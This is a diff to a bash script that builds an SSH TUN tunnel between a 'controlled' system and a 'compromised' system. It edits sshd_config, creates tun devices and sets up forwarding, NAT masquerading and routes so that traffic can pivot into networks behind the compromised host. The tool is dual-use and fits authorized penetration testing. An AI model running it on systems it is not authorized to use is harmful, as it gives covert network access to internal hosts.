@@ -8,7 +8,6 @@ show_help() {
   echo "  -s, --source           Set up the controlled system"
   echo "  -t, --target           Set up the compromised system"
   echo "  -r, --routes [route(s)] Add routes (required with -s or -t)"
-  echo "  -at, --adapter-type    Choose adapter type (tap or tun)"
   echo "  -i, --interface        Specify the outgoing interface (default: eth0)"
   echo "  --cleanup [source|target]  Remove setup for controlled or compromised system"
   echo ""
@@ -30,6 +29,9 @@ show_help() {
   echo ""
 }
 
+routes=""
+interface="eth0"    # Default outgoing interface
+
 # Function to add routes
 add_routes() {
   local routes=$1
@@ -44,41 +46,30 @@ add_routes() {
 
 # Function to change SSH configuration on the controlled system
 change_ssh_config_controlled() {
-  # Modify /etc/ssh/sshd_config for the controlled system
-  echo "PermitTunnel yes" >> /etc/ssh/sshd_config
-  systemctl restart ssh
-  echo "[+] Changed SSH configuration on the controlled system"
-}
-
-# Function to set up TUN/TAP adapter
-setup_tun_tap() {
-  local device=$1
-  local ip_address=$2
-  local adapter_type=$3
-  # Set up TUN/TAP adapter and display a message
-  if [[ "$adapter_type" == "tap" ]]; then
-    mode="tap"
+  # Check if the configuration is already present and commented, and if not, add it
+  if ! grep -q "^\s*#?PermitTunnel yes" /etc/ssh/sshd_config; then
+    # Remove any commented-out PermitTunnel directive and add the active one
+    sed -i '/^#\?PermitTunnel/d' /etc/ssh/sshd_config
+    echo "PermitTunnel yes" >> /etc/ssh/sshd_config
+    systemctl restart ssh
+    echo "[+] Changed SSH configuration on the controlled system"
   else
-    mode="tun"
+    echo "[+] SSH configuration already includes PermitTunnel yes"
   fi
-  ip tuntap add dev "$device" mode "$mode" user root
-  ip addr add "$ip_address" dev "$device"
-  ip link set dev "$device" up
-  echo "[+] Set up $mode adapter $device with IP address $ip_address"
 }
 
 # Function to set up the controlled system
 setup_controlled_system() {
   # Implement controlled system setup steps
-  setup_tun_tap tun1 10.10.255.2/30 "$adapter_type"
-  sysctl -w net.ipv4.ip_forward=1
-  echo "[+] Enabled IP forwarding"
-  ip route add 10.10.255.1 via 10.10.255.2 dev tun1
-  echo "[+] Added route for 10.10.255.1 via 10.10.255.2 dev tun1"
+  ip tuntap add dev tun1 mode tun
+  ip addr add 10.10.255.2/30 dev tun1
+  echo "[+] Added IP to tun1"
+  ip link set dev tun1 up
+  echo "[+] tun1 link is now up"
   IFS=',' read -ra route_array <<< "$routes"  # Split comma-separated routes
   for route in "${route_array[@]}"; do
-    iptables -t nat -A POSTROUTING -d "$route" -o "$interface" -j MASQUERADE
-    echo "[+] Set up NAT with output interface: $interface for route $route"
+    ip route add "$route" via 10.10.255.1 dev tun1
+    echo "[+] Set up routing rule for route $route"
   done
 
   # Display additional messages
@@ -86,13 +77,22 @@ setup_controlled_system() {
   echo "[!] sudo $0 -r <route(s)> -t -i <outgoing interface>"
   echo "[!] To start the VPN connection, on the target host, run:"
   echo "[!] ssh -f -N -w 0:1 <ip>"
- 
 }
 
 # Function to set up the compromised system
 setup_compromised_system() {
+  echo "[Debug] adapter_type is set to: $adapter_type"
+
   # Implement compromised system setup steps
-  setup_tun_tap tun0 10.10.255.1/30 "$adapter_type"
+  ip tuntap add dev tun0 mode tun user root
+
+  echo "[+] Adding tuntap device tun0 for user root"
+  ip addr add 10.10.255.1/30 dev tun0
+  echo "[+] Adding ip address to tun0"
+  ip link set dev tun0 up
+  echo "[+] Activating tun0"
+  modprobe tun
+  echo "[+] Ran modprobe tun"
   sysctl -w net.ipv4.ip_forward=1
   echo "[+] Enabled IP forwarding"
   ip route add 10.10.255.2 via 10.10.255.1 dev tun0
@@ -102,6 +102,9 @@ setup_compromised_system() {
     iptables -t nat -A POSTROUTING -d "$route" -o "$interface" -j MASQUERADE
     echo "[+] Set up NAT with output interface: $interface for route $route"
   done
+
+  # Create the SSH tunnel
+  echo "ssh -f -N -w 0:1 <user@target>"
 }
 
 # Function to remove the setup on the controlled system
@@ -112,7 +115,7 @@ cleanup_controlled_system() {
   fi
   # Remove TUN/TAP adapter
   ip link del tun1
-  # Restore SSH configuration
+  # Remove SSH configuration change
   sed -i '/PermitTunnel yes/d' /etc/ssh/sshd_config
   systemctl restart ssh
   echo "[+] Cleaned up the controlled system"
@@ -143,10 +146,6 @@ if [[ $EUID -ne 0 ]]; then
   exit 1
 fi
 
-routes=""
-adapter_type="tap"  # Default adapter type
-interface="eth0"    # Default outgoing interface
-
 while [[ $# -gt 0 ]]; do
   case "$1" in
     -h | --help)
@@ -165,15 +164,6 @@ while [[ $# -gt 0 ]]; do
         shift
       else
         echo "[-] No routes specified. Use a valid route like '10.60.1.0/24' or a file containing routes."
-        exit 1
-      fi
-      ;;
-    -at | --adapter-type)
-      if [ -n "$2" ]; then
-        adapter_type="$2"
-        shift
-      else
-        echo "[-] No adapter type specified. Please use 'tap' or 'tun'."
         exit 1
       fi
       ;;
